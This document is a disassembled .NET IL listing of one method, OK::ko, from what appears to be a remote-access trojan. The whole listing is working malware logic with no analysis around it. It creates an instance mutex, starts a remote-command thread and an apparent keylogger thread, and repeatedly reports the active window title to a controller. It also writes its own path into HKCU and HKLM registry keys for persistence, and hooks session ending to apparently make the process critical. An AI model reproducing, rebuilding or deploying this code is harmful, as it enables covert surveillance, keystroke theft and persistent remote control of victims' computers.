  .method public static void  ko() cil managed
  {
    // Code size       744 (0x2e8)
    .maxstack  5
    .locals init (int32 V_0,
             bool V_1,
             string V_2,
             class [mscorlib]System.Threading.Thread V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class j.kl V_12)
    IL_0000:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0005:  brfalse.s  IL_0040

    .try
    {
      IL_0007:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_000c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0011:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0016:  ldstr      "di"
      IL_001b:  ldstr      "!"
      IL_0020:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_0025:  leave.s    IL_0036

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0027:  dup
      IL_0028:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_002d:  stloc.s    V_4
      IL_002f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0034:  leave.s    IL_0036

    }  // end handler
    IL_0036:  ldc.i4     0x1388
    IL_003b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0040:  ldc.i4.0
    IL_0041:  stloc.1
    IL_0042:  ldc.i4.1
    IL_0043:  ldsfld     string j.OK::RG
    IL_0048:  ldloca.s   V_1
    IL_004a:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_004f:  stsfld     object j.OK::MT
    IL_0054:  ldloc.1
    IL_0055:  brtrue.s   IL_005c

    IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_005c:  call       void j.OK::INS()
    IL_0061:  ldsfld     bool j.OK::Idr
    IL_0066:  brtrue.s   IL_008b

    IL_0068:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_006d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0072:  stsfld     string j.OK::EXE
    IL_0077:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_007c:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0081:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0086:  stsfld     string j.OK::DR
    IL_008b:  ldnull
    IL_008c:  ldftn      void j.OK::RC()
    IL_0092:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0097:  ldc.i4.1
    IL_0098:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_009d:  stloc.3
    IL_009e:  ldloc.3
    IL_009f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_00a4:  newobj     instance void j.kl::.ctor()
      IL_00a9:  stsfld     class j.kl j.OK::kq
      IL_00ae:  ldsfld     class j.kl j.OK::kq
      IL_00b3:  dup
      IL_00b4:  ldvirtftn  instance void j.kl::WRK()
      IL_00ba:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_00bf:  ldc.i4.1
      IL_00c0:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_00c5:  stloc.3
      IL_00c6:  ldloc.3
      IL_00c7:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_00cc:  leave.s    IL_00dd

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ce:  dup
      IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d4:  stloc.s    V_5
      IL_00d6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00db:  leave.s    IL_00dd

    }  // end handler
    IL_00dd:  ldc.i4.0
    IL_00de:  stloc.0
    IL_00df:  ldstr      ""
    IL_00e4:  stloc.2
    IL_00e5:  ldsfld     bool j.OK::BD
    IL_00ea:  brfalse.s  IL_0114

    .try
    {
      IL_00ec:  ldnull
      IL_00ed:  ldftn      void j.OK::_Lambda$__2(object,
                                                              class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_00f3:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_00f8:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_00fd:  ldc.i4.1
      IL_00fe:  call       void j.OK::pr(int32)
      IL_0103:  leave.s    IL_0114

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0105:  dup
      IL_0106:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_010b:  stloc.s    V_6
      IL_010d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0112:  leave.s    IL_0114

    }  // end handler
    IL_0114:  ldc.i4     0x3e8
    IL_0119:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_011e:  ldsfld     bool j.OK::Cn
    IL_0123:  brtrue.s   IL_012b

    IL_0125:  ldstr      ""
    IL_012a:  stloc.2
    IL_012b:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_0130:  ldloc.0
      IL_0131:  ldc.i4.1
      IL_0132:  add.ovf
      IL_0133:  stloc.0
      IL_0134:  ldloc.0
      IL_0135:  ldc.i4.5
      IL_0136:  bne.un.s   IL_015d

      .try
      {
        IL_0138:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_013d:  ldc.i4     0x400
        IL_0142:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_0147:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_014c:  leave.s    IL_015d

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_014e:  dup
        IL_014f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0154:  stloc.s    V_7
        IL_0156:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_015b:  leave.s    IL_015d

      }  // end handler
      IL_015d:  ldloc.0
      IL_015e:  ldc.i4.8
      IL_015f:  blt.s      IL_0190

      IL_0161:  ldc.i4.0
      IL_0162:  stloc.0
      IL_0163:  call       string j.OK::ACT()
      IL_0168:  stloc.s    V_8
      IL_016a:  ldloc.2
      IL_016b:  ldloc.s    V_8
      IL_016d:  ldc.i4.0
      IL_016e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0173:  ldc.i4.0
      IL_0174:  beq.s      IL_0190

      IL_0176:  ldloc.s    V_8
      IL_0178:  stloc.2
      IL_0179:  ldstr      "act"
      IL_017e:  ldsfld     string j.OK::Y
      IL_0183:  ldloc.s    V_8
      IL_0185:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_018a:  call       bool j.OK::Send(string)
      IL_018f:  pop
      IL_0190:  ldsfld     bool j.OK::Isu
      IL_0195:  brfalse    IL_02d2

      .try
      {
        IL_019a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_019f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_01a4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_01a9:  ldsfld     string j.OK::sf
        IL_01ae:  ldstr      "\\"
        IL_01b3:  ldsfld     string j.OK::RG
        IL_01b8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01bd:  ldstr      ""
        IL_01c2:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_01c7:  ldstr      "\""
        IL_01cc:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_01d1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_01d6:  ldstr      "\" .."
        IL_01db:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_01e0:  ldc.i4.0
        IL_01e1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_01e6:  brfalse.s  IL_0225

        IL_01e8:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_01ed:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_01f2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_01f7:  ldsfld     string j.OK::sf
        IL_01fc:  ldc.i4.1
        IL_01fd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0202:  ldsfld     string j.OK::RG
        IL_0207:  ldstr      "\""
        IL_020c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0211:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0216:  ldstr      "\" .."
        IL_021b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0220:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0225:  leave.s    IL_0236

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0227:  dup
        IL_0228:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_022d:  stloc.s    V_9
        IL_022f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0234:  leave.s    IL_0236

      }  // end handler
      .try
      {
        IL_0236:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_023b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0240:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0245:  ldsfld     string j.OK::sf
        IL_024a:  ldstr      "\\"
        IL_024f:  ldsfld     string j.OK::RG
        IL_0254:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0259:  ldstr      ""
        IL_025e:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0263:  ldstr      "\""
        IL_0268:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_026d:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0272:  ldstr      "\" .."
        IL_0277:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_027c:  ldc.i4.0
        IL_027d:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0282:  brfalse.s  IL_02c1

        IL_0284:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0289:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_028e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0293:  ldsfld     string j.OK::sf
        IL_0298:  ldc.i4.1
        IL_0299:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_029e:  ldsfld     string j.OK::RG
        IL_02a3:  ldstr      "\""
        IL_02a8:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02ad:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02b2:  ldstr      "\" .."
        IL_02b7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02bc:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02c1:  leave.s    IL_02d2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02c3:  dup
        IL_02c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02c9:  stloc.s    V_10
        IL_02cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02d0:  leave.s    IL_02d2

      }  // end handler
      IL_02d2:  leave.s    IL_02e3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02d4:  dup
      IL_02d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02da:  stloc.s    V_11
      IL_02dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_02e1:  leave.s    IL_02e3

    }  // end handler
    IL_02e3:  br         IL_0114
  } // end of method OK::ko
